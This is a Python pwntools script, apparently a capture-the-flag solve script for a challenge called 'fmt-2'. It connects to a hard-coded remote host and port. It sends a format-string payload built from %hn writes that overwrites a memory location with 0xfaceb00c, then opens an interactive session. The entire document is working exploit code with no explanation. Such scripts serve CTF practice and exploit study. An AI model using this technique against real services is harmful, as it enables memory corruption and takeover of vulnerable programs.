from pwn import *

ip = "140.110.112.77"
port = 4003

r = remote(ip, port)
# r = process("./fmt-2")

context.arch = "amd64"

magic = 0x404050
length = 0x48
target = 0xfaceb00c

payload = b""

idx = 13
pre = 0
for i in range(2):
    val = (target & 0xffff) - pre
    target >>= 16
    val %= 65536
    if val == 0:
        val = 65536
    pre = val
    payload += f"%{val}c%{idx + i}$hn".encode()

payload = payload.ljust(length - 0x10) + flat([magic + i * 2 for i in range(2)])

r.sendafter(":", payload)

r.interactive()
